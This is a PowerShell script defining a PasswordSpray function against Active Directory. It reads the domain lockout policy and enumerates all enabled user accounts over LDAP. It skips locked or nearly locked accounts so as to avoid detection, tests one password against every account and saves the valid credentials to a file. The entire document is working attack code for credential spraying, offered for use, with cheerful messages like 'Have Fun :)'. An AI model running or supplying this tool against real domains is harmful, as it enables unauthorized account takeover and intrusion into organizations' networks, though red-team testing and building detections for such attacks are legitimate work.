function PasswordSpray {
    [CmdletBinding()]
    param(
        [string]$Domain, 
        [string]$Password,
		[switch]$Justsuccess
		
    )


    function Convert-FileTimeUtc {
        param([object]$Value)
        if ($null -eq $Value) { return $null }
        try {
            $i64 = [int64]$Value
            if ($i64 -eq 0) { return $null }
            [DateTime]::FromFileTimeUtc($i64)
        } catch { $null }
    }
    function Convert-AdTicks {
        param([object]$Value)
        if ($null -eq $Value) { return $null }
        try { [TimeSpan]::FromTicks([int64]$Value).Duration() } catch { $null }
    }
	
	
    $hitsCsv = Join-Path $PWD "valid_hits.txt"
    if (Test-Path -LiteralPath $hitsCsv) { Remove-Item -LiteralPath $hitsCsv -Force -ErrorAction SilentlyContinue }

    if (-not (Test-Path $hitsCsv)) {
        [pscustomobject]@{
            SamAccountName = ''
            Password       = ''
            TimeUTC        = [datetime]::UtcNow
        } | Select-Object SamAccountName,Password,TimeUTC | Export-Csv -Path $hitsCsv -NoTypeInformation
        
    }
            

    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    try {
        $ctx  = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
        $pdc  = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($ctx).PdcRoleOwner.Name
    } catch { $pdc = $Domain }

    $root     = [adsi]"LDAP://$pdc/RootDSE"
    $domainDN = $root.defaultNamingContext
    if (-not $domainDN) { throw "Failed reading defaultNamingContext from RootDSE on $pdc" }

    Write-Host "[+] Using PDC Emulator: $($pdc)" -ForegroundColor Yellow
	Write-Host " "

  
    $de = New-Object DirectoryServices.DirectoryEntry("LDAP://$pdc/$domainDN")
    $sr = New-Object DirectoryServices.DirectorySearcher($de)
    $sr.SearchScope = "Base"
    $sr.Filter = "(objectClass=domainDNS)"
    @("lockoutThreshold","lockoutDuration","lockoutObservationWindow","minPwdLength","maxPwdAge","minPwdAge","pwdHistoryLength","pwdProperties") | ForEach-Object { [void]$sr.PropertiesToLoad.Add($_) }

    $res = $sr.FindOne()
    if (-not $res) { throw "Domain policy object not found on $pdc ($domainDN)" }
    $props = $res.Properties


	function Get-Prop {
		param($h, $k)
		if ($h -and $h.Contains($k) -and $h[$k].Count -gt 0) { $h[$k][0] } else { $null }
	}

	$LockoutThreshold = [int](Get-Prop $props 'lockoutthreshold')
	$LockoutDuration  = Convert-AdTicks (Get-Prop $props 'lockoutduration')
	$ObsWindow        = Convert-AdTicks (Get-Prop $props 'lockoutobservationwindow')
	$MinPwdLength     = [int](Get-Prop $props 'minpwdlength')
	$MaxPwdAge        = Convert-AdTicks (Get-Prop $props 'maxpwdage')
	$MinPwdAge        = Convert-AdTicks (Get-Prop $props 'minpwdage')
	$PwdHistory       = [int](Get-Prop $props 'pwdhistorylength')
	$PwdProperties    = [int](Get-Prop $props 'pwdproperties')


    $PasswordPolicy = [pscustomobject]@{
      LockoutThreshold          = $LockoutThreshold
      LockoutObservationWindowM = [int]$ObsWindow.TotalMinutes
      LockoutDurationM          = [int]$LockoutDuration.TotalMinutes
      MinPasswordLength         = $MinPwdLength
      MaxPasswordAgeDays        = [int]$MaxPwdAge.TotalDays
      MinPasswordAgeDays        = [int]$MinPwdAge.TotalDays
      PasswordHistoryLength     = $PwdHistory
      PwdPropertiesFlags        = $PwdProperties
    }

    Write-Host "[+] Got Domain Password Policy :)" -ForegroundColor Yellow
    if($($PasswordPolicy.LockoutThreshold) -eq "0"){
        Write-Host "	[!] Lockout Threshold            : $($PasswordPolicy.LockoutThreshold) - Have Fun :)" -ForegroundColor Cyan
    }
    else{
        Write-Host "	[*] Lockout Threshold            : $($PasswordPolicy.LockoutThreshold)" -ForegroundColor Cyan
    }
    Write-Host "	[*] Lockout Observation Window   : $($PasswordPolicy.LockoutObservationWindowM) minutes" -ForegroundColor Cyan
    Write-Host "	[*] Lockout Duration             : $($PasswordPolicy.LockoutDurationM) minutes" -ForegroundColor Cyan
    Write-Host "	[*] Minimum Password Length      : $($PasswordPolicy.MinPasswordLength)" -ForegroundColor Cyan
    Write-Host "	[*] Maximum Password Age (days)  : $($PasswordPolicy.MaxPasswordAgeDays)" -ForegroundColor Cyan
    Write-Host "	[*] Minimum Password Age (days)  : $($PasswordPolicy.MinPasswordAgeDays)" -ForegroundColor Cyan
    Write-Host "	[*] Password History Length      : $($PasswordPolicy.PasswordHistoryLength)" -ForegroundColor Cyan
    Write-Host "================================================" -ForegroundColor Yellow
	Write-Host " "

    $entry    = New-Object DirectoryServices.DirectoryEntry("LDAP://$pdc/$domainDN")
    $searcher = New-Object DirectoryServices.DirectorySearcher($entry)
    $searcher.Filter    = "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" 
    $searcher.PageSize  = 1000
    $searcher.SizeLimit = 0
    @("samAccountName","userAccountControl","memberOf","badPwdCount","badPasswordTime","pwdLastSet","lockoutTime") | ForEach-Object { [void]$searcher.PropertiesToLoad.Add($_) }

	
	Write-Host "[>] Query LDAP for getting all sam user accounts..." -ForegroundColor Yellow
    $results = $searcher.FindAll()

    $nowUtc = (Get-Date).ToUniversalTime()
    $obsTs  = [TimeSpan]::FromMinutes($PasswordPolicy.LockoutObservationWindowM)

    $users = $results | ForEach-Object {
        $p   = $_.Properties
        if (-not $p.Contains('samaccountname')) { return }

        $sam = $p['samaccountname'] | Select-Object -First 1
        $uac = if ($p.Contains('useraccountcontrol')) { $p['useraccountcontrol'] | Select-Object -First 1 } else { $null }

        $enabled     = -not ( [int]$uac -band 2 )
        $badPwdCount = if ($p.Contains('badpwdcount'))     {
							[int]($p['badpwdcount'] | Select-Object -First 1) 
						} else {
							0 
						}
        $badPwdTime  = if ($p.Contains('badpasswordtime')) { Convert-FileTimeUtc ($p['badpasswordtime'] | Select-Object -First 1) } else { $null }
        $pwdLastSet  = if ($p.Contains('pwdlastset'))      { Convert-FileTimeUtc ($p['pwdlastset'] | Select-Object -First 1) } else { $null }
        $lockoutTime = if ($p.Contains('lockouttime'))     { Convert-FileTimeUtc ($p['lockouttime'] | Select-Object -First 1) } else { $null }

        $groups = @()
        if ($p.Contains('memberof')) { $groups = @($p['memberof'] | ForEach-Object { $_.ToString() }) }
        $isAdmin = [bool]($groups -match '(?i)admin')

    
        $withinWindow = ($badPwdTime -and (($nowUtc - $badPwdTime) -lt $obsTs))
        $nearLock     = ($PasswordPolicy.LockoutThreshold -gt 0) -and $withinWindow -and ($badPwdCount -ge ($PasswordPolicy.LockoutThreshold - 1))
        $remaining    = if ($PasswordPolicy.LockoutThreshold -gt 0 -and $withinWindow) { 
                            [Math]::Max(0, $PasswordPolicy.LockoutThreshold - $badPwdCount) 
                        } else {
							$PasswordPolicy.LockoutThreshold 
						}

        [pscustomobject]@{
            SamAccountName     = $sam
            Enabled            = $enabled
            badPwdCount        = $badPwdCount
            badPasswordTimeUTC = $badPwdTime
            pwdLastSetUTC      = $pwdLastSet
            lockoutTimeUTC     = $lockoutTime
            Groups             = $groups -join ';'
            IsAdminGroupMember = $isAdmin
            NearLockout        = $nearLock
            RemainingAttempts  = $remaining
        }
    }

$Total = $users.Count
if ($Total -eq 0) {
    Write-Host "[!] No target users found. Exiting." -ForegroundColor Yellow
    return
}

$okCount   = 0
$failCount = 0
$skipLock  = 0
$skipNear  = 0
$idx       = 0

$PrincipalCtx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('Domain', $Domain)
$sw = [System.Diagnostics.Stopwatch]::StartNew()
$UpdateEvery = [Math]::Max([int]($Total/200), 1)

function Update-ProgressView {
    param([int]$IdxNow, [string]$CurrentSam)

    if (($IdxNow % $UpdateEvery) -ne 0 -and $IdxNow -ne $Total) { return }

    $percent   = [int](($IdxNow / $Total) * 100)
    $rate      = if ($IdxNow -gt 0) { $sw.Elapsed.TotalSeconds / $IdxNow } else { 0 }
    $remaining = [TimeSpan]::FromSeconds($rate * ($Total - $IdxNow))
    $status    = "Processed $IdxNow/$Total · OK:$okCount · Fail:$failCount · Skip-Lock:$skipLock · Skip-Near:$skipNear"

    Write-Progress -Id 1 `
        -Activity "Password spray on $Domain" `
        -Status $status `
        -PercentComplete $percent `
        -SecondsRemaining ([int][Math]::Max($remaining.TotalSeconds,0)) `
        -CurrentOperation ("Current: {0}" -f $CurrentSam)
}

Write-Host "[+] Found $Total targeted user Accounts" -ForegroundColor Yellow
Write-Host "[+] Starting.." -ForegroundColor Yellow

foreach ($u in $users) {
    $idx++

    if ($u.lockoutTimeUTC) {
        $skipLock++
        Write-Host "[!] $($u.SamAccountName) is currently LOCKED (since $($u.lockoutTimeUTC)). Skipping." -ForegroundColor Red
        Update-ProgressView -IdxNow $idx -CurrentSam $u.SamAccountName
        continue
    }

    if ($u.NearLockout) {
        $skipNear++
        Write-Host "[!] $($u.SamAccountName) has ONLY $($u.RemainingAttempts) attempt(s) left within window. Skipping." -ForegroundColor Gray
        Update-ProgressView -IdxNow $idx -CurrentSam $u.SamAccountName
        continue
    }

    $ok = $PrincipalCtx.ValidateCredentials(
        $u.SamAccountName, $Password,
        [System.DirectoryServices.AccountManagement.ContextOptions]::Negotiate
    )

    if ($ok) {
        $okCount++
        Write-Host "[+] Great! $($u.SamAccountName) :  $($Password)" -ForegroundColor Green
        [pscustomobject]@{
            SamAccountName = $u.SamAccountName
            Password       = $Password
            TimeUTC        = (Get-Date).ToUniversalTime()
        } | Export-Csv -Path $hitsCsv -NoTypeInformation -Append
    }
    else {
        $failCount++
        if (-not $Justsuccess) {
            Write-Host "[-] Oh No.. User Account $($u.SamAccountName) is sad :( " -ForegroundColor DarkRed
        }
    }

    Update-ProgressView -IdxNow $idx -CurrentSam $u.SamAccountName
}

Write-Progress -Id 1 -Activity "Password spray on $Domain" -Completed
$sw.Stop()
Write-Host ("[+] Done. OK:{0} | Fail:{1} | Skip-Lock:{2} | Skip-Near:{3}" -f $okCount,$failCount,$skipLock,$skipNear) -ForegroundColor Yellow

 
}
